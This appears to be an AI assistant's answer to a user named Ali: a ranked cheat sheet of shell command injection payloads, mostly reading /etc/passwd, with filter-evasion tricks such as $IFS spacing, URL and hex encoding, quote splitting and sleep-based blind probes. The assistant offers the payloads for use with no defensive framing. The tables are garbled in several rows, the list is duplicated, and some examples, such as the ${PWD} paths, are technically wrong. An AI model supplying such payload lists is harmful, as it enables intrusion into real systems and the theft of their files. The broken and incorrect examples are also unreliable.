Alright Ali — let’s build you a **proper, ranked cheat sheet** of **command injection payload styles** from the most common to the more niche ones, and I’ll also include the **important bypass equivalents** so you know exactly what each trick means.

This list is based on common usage in penetration testing and CTFs, moving from **most popular** to **less common** .

---

## 🏆 Command Injection Payload Styles (Ranked)

| Rank | Payload Style                        | Example                   | What It Does                                          | Why Popular                                      |     |
| ---- | ------------------------------------ | ------------------------- | ----------------------------------------------------- | ------------------------------------------------ | --- | --- |
| 1️⃣   | **Direct Command**                   | `cat /etc/passwd`         | Executes the command directly.                        | First thing testers try — works if no filtering. |     |
| 2️⃣   | **Command Separator (`;`)**          | `; cat /etc/passwd`       | Runs next command regardless of previous result.      | Works in most shells, very common.               |     |
| 3️⃣   | **Logical AND (`&&`)**               | `&& cat /etc/passwd`      | Runs next command only if previous succeeds.          | Useful for chaining without breaking logic.      |     |
| 4️⃣   | \*\*Logical OR (`                    |                           | `)\*\*                                                | `                                                |     |
| 5️⃣   | \*\*Pipe (`                          | `)\*\*                    | `                                                     | cat /etc/passwd`                                 |     |
| 6️⃣   | **Command Substitution `$()`**       | `$(cat /etc/passwd)`      | Executes inside subshell, replaces with output.       | Evades some naive filters.                       |     |     |
| 7️⃣   | **Command Substitution (Backticks)** | `cat /etc/passwd`         | Same as `$()`, older syntax.                          | Still works in many shells.                      |     |
| 8️⃣   | **Whitespace Bypass with `$IFS`**    | `cat$IFS/etc/passwd`      | `$IFS`= Internal Field Separator (space/tab/newline). | Bypasses filters blocking spaces.                |     |     |
| 9️⃣   | **Variable Path Expansion**          | `cat ${PWD}/etc/passwd`   | Uses env vars to hide path parts.                     | Evades keyword/path filters.                     |     |
| 🔟   | **Concatenation Tricks**             | `ca''t /etc/passwd`       | Breaks up keywords to bypass filters.                 | Useful against simple regex filters.             |     |
| 1️⃣1️⃣ | **URL Encoding**                     | `%63%61%74%20/etc/passwd` | Encodes characters to bypass filters.                 | Works if input is decoded before execution.      |     |
| 1️⃣2️⃣ | **Hex/Octal Encoding**               | `$(echo 63617420...       | xxd -r -p)`                                           | Encodes payload to hide it.                      |     |
| 1️⃣3️⃣ | **Newline Injection**                | `cat /etc/passwd\nwhoami` | Uses newline to split commands.                       | Works in some interpreters.                      |     |
| 1️⃣4️⃣ | **File Descriptor Redirection**      | `cat /etc/passwd 2>&1`    | Redirects errors to output.                           | Useful for blind injection.                      |     |
| 1️⃣5️⃣ | **Time Delay (Blind)**               | `; sleep 5`               | Delays response to confirm injection.                 | Used in blind detection.                         |     |

---

## 📜 Important Bypass Equivalents

| Symbol / Variable | Meaning                                      | Usage                  |     |     |
| ----------------- | -------------------------------------------- | ---------------------- | --- | --- | --- | --- |
| `$IFS`            | Internal Field Separator (space/tab/newline) | `cat$IFS/etc/passwd`   |     |     |     |     |
| `${IFS}`          | Same as `$IFS`                               | `cat${IFS}/etc/passwd` |     |     |     |
| `%20`             | URL-encoded space                            | `cat%20/etc/passwd`    |     |     |
| `%0a`             | URL-encoded newline                          | `cat%0a/etc/passwd`    |     |     |
| `${PWD}`          | Current working directory                    | `cat${PWD}/etc/passwd` |     |     |     |     |
| `${HOME}`         | Home directory                               | `cat${HOME}/file`      |     |     |     |     |
| `\`(backslash)    | Escapes next character or joins lines        | `cat\ /etc/passwd`     |     |     |
| `\t`              | Tab character                                | `cat\t/etc/passwd`     |     |     |
| `$(...)`          | Command substitution                         | `$(whoami)`            |     |     |     |     |
| `...`             | Command substitution (legacy)                | `whoami`               |     |     |

---

---

## 🏆 Command Injection Payload Styles (Most Popular → Less Common)

1. **Direct Command**

   ```
   cat /etc/passwd
   ```

   - Straight execution, no tricks.
   - Works if no filtering at all.

2. **Command Separator (`;`)**

   ```
   ; cat /etc/passwd
   ```

   - Runs next command regardless of previous result.
   - Very common in Bash/sh.

3. **Logical AND (`&&`)**

   ```
   && cat /etc/passwd
   ```

   - Runs next command only if previous succeeds.
   - Useful for chaining without breaking logic.

4. **Logical OR (`||`)**

   ```
   || cat /etc/passwd
   ```

   - Runs next command only if previous fails.
   - Good for error-based testing.

5. **Pipe (`|`)**

   ```
   | cat /etc/passwd
   ```

   - Sends output of first command into second.
   - Can bypass filters expecting standalone commands.

6. **Command Substitution – Modern (`$()`)**

   ```
   $(cat /etc/passwd)
   ```

   - Executes inside subshell, replaces with output.
   - Evades some naive filters.

7. **Command Substitution – Legacy (Backticks)**

   ```
   `cat /etc/passwd`
   ```

   - Same as `$()`, older syntax.
   - Still works in many shells.

8. **Whitespace Bypass with `$IFS`**

   ```
   cat$IFS/etc/passwd
   ```

   - `$IFS` = Internal Field Separator (space/tab/newline).
   - Bypasses filters blocking spaces.

9. **Variable Path Expansion**

   ```
   cat ${PWD}/etc/passwd
   ```

   - Uses environment variables to hide path parts.
   - Evades keyword/path filters.

10. **Concatenation Tricks**

    ```
    ca''t /etc/passwd
    ```

    - Breaks up keywords to bypass regex filters.

11. **URL Encoding**

    ```
    cat%20/etc/passwd
    ```

    - `%20` = space.
    - Works if input is URL-decoded before execution.

12. **Hex/Octal Encoding**

    ```
    $(echo 636174202f6574632f706173737764 | xxd -r -p)
    ```

    - Encodes payload to hide it.
    - Evades signature-based detection.

13. **Newline Injection**

    ```
    cat /etc/passwd
    whoami
    ```

    - Uses newline to split commands.
    - Works in some interpreters.

14. **File Descriptor Redirection**

    ```
    cat /etc/passwd 2>&1
    ```

    - Redirects errors to output.
    - Useful for blind injection.

15. **Time Delay (Blind)**

    ```
    ; sleep 5
    ```

    - Delays response to confirm injection.
    - Used in blind detection.

---

## 📜 Important Bypass Equivalents

| Symbol / Variable | Meaning                                      | Example                |
| ----------------- | -------------------------------------------- | ---------------------- | --- | --- |
| `$IFS`/`${IFS}`   | Internal Field Separator (space/tab/newline) | `cat$IFS/etc/passwd`   |
| `%20`             | URL-encoded space                            | `cat%20/etc/passwd`    |
| `%0a`             | URL-encoded newline                          | `cat%0a/etc/passwd`    |
| `${PWD}`          | Current working directory                    | `cat${PWD}/etc/passwd` |     |     |
| `${HOME}`         | Home directory                               | `cat${HOME}/file`      |     |     |
| `\`(backslash)    | Escapes next character or joins lines        | `cat\ /etc/passwd`     |
| `\t`              | Tab character                                | `cat\t/etc/passwd`     |
| `$(...)`          | Command substitution                         | `$(whoami)`            |     |     |
| `...`             | Command substitution (legacy)                | `whoami`               |
| `${VAR}`          | Variable expansion                           | `cat${VAR}/file`       |     |     |

---
